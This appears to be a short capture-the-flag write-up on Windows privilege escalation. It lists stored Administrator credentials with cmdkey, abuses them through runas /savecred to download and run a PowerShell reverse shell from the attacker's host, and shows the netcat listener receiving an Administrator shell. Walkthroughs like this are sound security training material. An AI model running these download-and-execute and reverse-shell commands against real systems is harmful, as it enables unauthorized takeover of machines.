# 15 - PrivEsc


# winpeas is blocked
```
PS C:\Users\security\documents> Invoke-PowerShellTcp : Program 'winpeas.exe' failed to execute: This program is blocked by group policy. For more information, contact your system administrat
or                                                                                                                                                                                            
At line:1 char:14                                                                                                                                                                             
+ .\winpeas.exe <<<< .                                                                                                                                                                        
At line:127 char:21                                                                                                                                                                           
+ Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.10.14.18 -Port 4444                                                                                                                       
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException                                                                                                            
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-PowerShellTcp
```



# Stored credentials
```
PS C:\Users> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator



```


# Privilege escalation

```bash
PS C:\Users> runas /savecred /user:ACCESS\Administrator "cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.18/rev.ps1')"
```

# Reverse shell
```bash
┌─[user@parrot]─[10.10.14.18]─[/opt/JAWS]
└──╼ $ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from megacorp.com [10.10.10.98] 49184
Windows PowerShell running as user Administrator on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
access\administrator
PS C:\Windows\system32> 
```